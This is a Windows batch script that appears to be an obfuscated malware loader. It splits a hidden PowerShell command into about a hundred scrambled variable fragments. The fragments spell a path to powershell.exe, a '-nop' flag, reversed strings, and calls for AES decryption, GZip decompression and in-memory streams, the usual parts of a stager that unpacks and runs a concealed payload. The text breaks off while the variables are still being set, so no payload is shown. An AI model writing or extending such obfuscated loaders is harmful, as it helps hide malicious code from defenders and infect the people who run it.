@echo off
set "EWvRSMcCcH=he"
set "wmRJwmpAVO=nd"
set "adADbfaUad=co"
set "lzaeJWiPQP=Po"
set "QhIKidgtcY=32"
set "bydEjwspyY=ll"
set "TNNZInoQdj= C"
set "RYUvgAEXhp=we"
set "HAKQkZWfQz=py"
set "nifHoYBSRg=.e"
set "GNdxNwHJUu=Sy"
set "tFeAongPmi= /"
set "BxzQyEyLDY=\W"
set "PUEWwcvNva=rS"
set "SFrEhxGAMG=Wi"
set "ldGMDeOEhG=do"
set "qnqdFJkDci=em"
set "GfBYNxQMmu=we"
set "AvuQkKJKfb=1."
set "BvylxTOAEa=ws"
set "mazmqkRnWB=xe"
set "vnKFyRgmWa=0\"
set "iVpvWDIlGB=po"
set "IztqGAYjdC=:\"
set "dbnklrUeHG=\v"
set "kHhHyEgYTH=he"
set "MktwEPqILt=rs"
set "bMbnGnviRk=s\"
set "VYNrZwUzxZ=ll"
set "xbjMgcBAtz=y "
set "yUYTTsxaSe=in"
set "RkQQuigtkJ=ow"
set "lxopKIPBkY=st"
set "kVyyjLzeLC=cd"
set "lrgsCDFGpL= %~dp0"
set "vncmNhDEWU=.Dis"
set "ulwJIbVkjU=sGUc"
set "weWUdmQozV=);$E"
set "SMzRmyXpMo=rHjp"
set "JmLFENjySq=3); "
set "QVaZfvVByR=and "
set "uSqzAyRozU=('%*'"
set "pRTkEOJwmx=('da"
set "ZIRLPJNEZj=oL'["
set "OqdejCgUzC=e]::"
set "CwyMhdaqoG=ring"
set "SmwhwIzCVY=Disp"
set "YNPymnMvBY=yJky"
set "WapByhbIzk=comp"
set "TTdYqErVno=ptor"
set "oqbgxgSHfI=pher"
set "KiLOlsxYdr=.Cre"
set "NTlmeicnPr=onve"
set "BPqEMkDwFL=]::("
set "ghhXHVtmHl=ay()"
set "qIFGYzRjFb=)($y"
set "awLyCDtFPa=s = "
set "BNyKDaAaZI=:: '"
set "AdvVeONHuv=Comp"
set "kcpigVSKfL=gnir"
set "esyijmOzCQ=k; }"
set "OSuQxVLRDB=ufvO"
set "yhQwlRATYx=am;$"
set "sTjLGvMANi=rity"
set "XdQLhOjrVw='gni"
set "DXopieIRII=[Sys"
set "MRjurRJPru=ateD"
set "WLzyDaMZng=);$T"
set "oBXwXKHiHw=('l0"
set "WKeAOGuVSh=oin "
set "HlgHCKBUUt=ck($"
set "VSSxKVodII=-Obj"
set "ZjmIhPuoom=fore"
set "HMfZeukwNh=TllA"
set "uJLzxbcXJG=tem."
set "YQxuVPvwgu='')("
set "pRCWEgLhGl=  $L"
set "mSlWnuHEhV=rWG "
set "GBfUssAOtu=em.I"
set "PTRHHtINby=]::("
set "KYihRHYmFF=ose("
set "kafdgJAELQ=.GZi"
set "qoRocfvYcH=Stre"
set "UPPbkQhbWR=rans"
set "RKPGrWOvoT=$fzo"
set "gyApXBHMDL=1..-"
set "kSEiGprEhm=e = "
set "JqJlMWRoxZ=:('g"
set "NydUPeGpma=Star"
set "AvFCppWkUJ=[Sys"
set "iQWDgZxbRF=-1.."
set "tUeRYthxOT=[]] "
set "etcsJUtBmy=-joi"
set "xapXcdDBWp=-nop"
set "BDnWQuHYlI=;$Zg"
set "duGIJNcxCz=tem."
set "hFngBJLOaW=[IO."
set "bveUhNttjp=oryS"
set "OTsFeRFuIo=ne);"
set "UwfBiCwSEd=isfL"
set "yENYZQSltx=vj0m"
set "gpnKjBZGsM=ct S"
set "ksNfuDEzao=)) {"
